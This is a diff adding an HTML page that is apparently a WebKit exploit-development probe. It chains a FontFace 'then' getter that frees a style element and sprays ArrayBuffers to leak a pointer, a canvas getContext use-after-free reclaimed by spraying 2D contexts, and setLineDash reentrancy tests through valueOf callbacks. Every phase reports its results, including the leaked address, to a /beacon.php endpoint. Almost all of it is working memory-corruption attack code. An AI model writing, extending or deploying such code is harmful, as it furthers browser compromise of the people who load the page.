@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P822: Reentrant IDL Vector Desync Probe</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P822...</div>
+<h2>P822: Reentrant IDL Vector Desynchronization & State Mutation</h2>
+<pre id="log">Initializing diagnostic run...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P822-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] Probe P822 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: FontFace Baseline
+ * ============================================================ */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown';
+  if (bestI >= 0 && bestNz >= 4) {
+    var fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true);
+    var q11hi = fontDV.getUint32(0x5C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      var H_hi = q11hi - borrow, H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+  }
+
+  log('[+] Phase 1: FontFace H = ' + Hstr, 'ok');
+  syncBn('FONT-OK', 'H=' + Hstr);
+
+  /* ============================================================
+   * PHASE 2: Canvas UAF + Same-Type Reclaim
+   * ============================================================ */
+  var innerCtx = null;
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() {
+      innerCtx = canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer', opts);
+
+  if (!innerCtx) {
+    log('[-] Canvas UAF failed', 'fail');
+    syncBn('UAF-FAIL', '');
+    return;
+  }
+
+  var sprayCtxs = [];
+  for (var s = 0; s < 200; s++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    ctx.lineWidth = 1000.0 + s;
+    sprayCtxs.push(ctx);
+  }
+
+  var aliasIdx = -1;
+  var initialLW = innerCtx.lineWidth;
+  if (initialLW >= 1000.0 && initialLW < 1200.0) {
+    aliasIdx = Math.round(initialLW - 1000.0);
+  }
+
+  if (aliasIdx < 0) {
+    log('[-] Reclaim miss (lw=' + initialLW + ')', 'fail');
+    syncBn('RECLAIM-MISS', 'lw=' + initialLW);
+    return;
+  }
+
+  var aliasCtx = sprayCtxs[aliasIdx];
+  log('[+] Reclaim verified at slot #' + aliasIdx, 'hot');
+  syncBn('RECLAIM-HIT', 'idx=' + aliasIdx);
+
+  /* ============================================================
+   * PHASE 3: IDL Sequence Reentrancy — Vector Buffer Resizing
+   *
+   * WebKit converts JS Array to Vector<double> by calling valueOf()
+   * on each element synchronously.
+   * During conversion of element 2, we mutate the canvas state from
+   * the other handle: reallocating the dash vector to 12 elements!
+   * ============================================================ */
+  log('[*] Phase 3: Testing IDL Sequence Reentrancy (Vector resizing mid-conversion)...', 'info');
+  var reentrancyFired = false;
+  var innerDashDuringValueOf = [];
+
+  var customElem = {
+    valueOf: function() {
+      reentrancyFired = true;
+      /* Reallocate dash buffer via the alias handle to 12 doubles */
+      innerCtx.setLineDash([1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.1, 11.2, 12.3]);
+      innerDashDuringValueOf = innerCtx.getLineDash();
+      return 99.9;
+    }
+  };
+
+  /* Outer call: 4 elements */
+  aliasCtx.setLineDash([10.0, 20.0, customElem, 40.0]);
+
+  var finalDashAlias = aliasCtx.getLineDash();
+  var finalDashInner = innerCtx.getLineDash();
+
+  log('[+] Phase 3 Results:', 'hot');
+  log('    Reentrancy callback fired: ' + reentrancyFired, 'ok');
+  log('    Dash len during valueOf: ' + innerDashDuringValueOf.length, 'info');
+  log('    Final dash len (aliasCtx): ' + finalDashAlias.length + ' -> ' + JSON.stringify(finalDashAlias), 'ok');
+  log('    Final dash len (innerCtx): ' + finalDashInner.length, 'ok');
+
+  syncBn('REENTRANT-DASH', 'fired=' + reentrancyFired + '|midLen=' + innerDashDuringValueOf.length + '|finalLen=' + finalDashAlias.length + '|vals=' + finalDashAlias.slice(0, 6).join(','));
+
+  /* ============================================================
+   * PHASE 4: IDL Sequence Reentrancy with Save / Restore
+   * ============================================================ */
+  log('[*] Phase 4: Testing State Stack mutation during IDL sequence conversion...', 'info');
+  var saveFired = false;
+  var customElem2 = {
+    valueOf: function() {
+      saveFired = true;
+      innerCtx.save();
+      innerCtx.lineWidth = 5555.5;
+      return 77.7;
+    }
+  };
+
+  aliasCtx.setLineDash([5.0, customElem2]);
+  var postDash = aliasCtx.getLineDash();
+  var postLW = aliasCtx.lineWidth;
+
+  log('[+] Phase 4 Results:', 'hot');
+  log('    Save callback fired: ' + saveFired, 'ok');
+  log('    Post lineWidth: ' + postLW, 'info');
+  log('    Post dash len: ' + postDash.length + ' -> ' + JSON.stringify(postDash), 'ok');
+
+  /* Restore state to clean up */
+  aliasCtx.restore();
+  var restoredLW = aliasCtx.lineWidth;
+  log('    Restored lineWidth: ' + restoredLW, 'ok');
+
+  syncBn('REENTRANT-SAVE', 'saveFired=' + saveFired + '|postLW=' + postLW + '|restoredLW=' + restoredLW + '|postDashLen=' + postDash.length);
+
+  /* ============================================================
+   * SUMMARY & COMPLETION
+   * ============================================================ */
+  banner.style.background = '#238636';
+  banner.textContent = 'STATUS: REENTRANCY DIAGNOSTIC COMPLETE';
+
+  log('----------------------------------------------------', 'info');
+  log('[*] All reentrancy tests completed safely without crash', 'hot');
+  log('----------------------------------------------------', 'info');
+
+  syncBn('DONE', 'status=complete|reentrancyFired=' + reentrancyFired + '|saveFired=' + saveFired);
+
+}, 400);
+</script>
+</body>
+</html>
